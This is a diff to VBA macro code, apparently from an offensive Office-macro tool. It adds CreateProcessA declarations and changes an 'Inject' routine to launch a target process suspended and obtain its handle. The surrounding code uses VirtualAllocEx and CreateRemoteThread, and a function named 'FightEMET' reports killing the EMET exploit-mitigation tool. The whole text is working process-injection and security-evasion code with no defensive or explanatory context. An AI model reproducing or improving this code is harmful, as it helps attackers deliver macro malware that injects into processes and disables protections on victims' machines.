@@ -13,6 +13,7 @@ Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProce
 Private Declare PtrSafe Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
 Private Declare PtrSafe Function GetCurrentProcess Lib "kernel32" () As LongPtr
 Private Declare PtrSafe Function IsWow64Process Lib "kernel32" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean
+Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
 Type SYSTEM_INFO
 wProcessorArchitecture As Integer
 wReserved As Integer
@@ -26,6 +27,32 @@ dwAllocationGranularity As Long
 wProcessorLevel As Integer
 wProcessorRevision As Integer
 End Type
+Type PROCESS_INFORMATION
+hProcess As Long
+hThread As Long
+dwProcessId As Long
+dwThreadId As Long
+End Type
+Type STARTUPINFO
+cb As Long
+lpReserved As String
+lpDesktop As String
+lpTitle As String
+dwX As Long
+dwY As Long
+dwXSize As Long
+dwYSize As Long
+dwXCountChars As Long
+dwYCountChars As Long
+dwFillAttribute As Long
+dwFlags As Long
+wShowWindow As Integer
+cbReserved2 As Integer
+lpReserved2 As Long
+hStdInput As Long
+hStdOutput As Long
+hStdError As Long
+End Type
 #Else
 Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
 Private Declare Function VirtualFreeEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
@@ -35,6 +62,7 @@ Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Lo
 Private Declare Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
 Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
 Private Declare Function IsWow64Process Lib "kernel32" (ByVal hProcess As Long, ByRef Wow64Process As Boolean) As Boolean
+Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
 Type SYSTEM_INFO
 wProcessorArchitecture As Integer
 wReserved As Integer
@@ -46,6 +74,32 @@ dwNumberOrfProcessors As Long
 dwProcessorType As Long
 dwAllocationGranularity As Long
 dwReserved As Long
+End Type
+Type PROCESS_INFORMATION
+hProcess As Long
+hThread As Long
+dwProcessId As Long
+dwThreadId As Long
+End Type
+Type STARTUPINFO
+cb As Long
+lpReserved As String
+lpDesktop As String
+lpTitle As String
+dwX As Long
+dwY As Long
+dwXSize As Long
+dwYSize As Long
+dwXCountChars As Long
+dwYCountChars As Long
+dwFillAttribute As Long
+dwFlags As Long
+wShowWindow As Integer
+cbReserved2 As Integer
+lpReserved2 As Long
+hStdInput As Long
+hStdOutput As Long
+hStdError As Long
 End Type
 #End If
 Public Function IsOffice64Bit() As Boolean
@@ -985,10 +1039,16 @@ FightEMET = killedEMET
 End Function
 Public Function Inject(processCmd As String) As Long
 Dim hProcess&, hThread&, lLinkToLibrary&, lSize&, hKernel&
+Dim pInfo As PROCESS_INFORMATION
+Dim sInfo As STARTUPINFO
+Dim sNull As String
+Dim sProc As String
+sInfo.dwFlags = 1
 If IsOffice64Bit Then
 On Error Resume Next
-A = Shell(processCmd, 0)
-hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, A)
+sProc = processCmd
+res = CreateProcessA(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)
+hProcess = pInfo.hProcess
 Dim b64 As Boolean
 b64 = False
 b64 = IsWow64(hProcess)
@@ -1046,8 +1106,9 @@ If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEA
 Inject = 1 'Success
 End If
 Else
-A = Shell(processCmd, 0)
-hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, A)
+sProc = processCmd
+res = CreateProcessA(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)
+hProcess = pInfo.hProcess
 If hProcess = 0 Then
 Exit Function
 End If
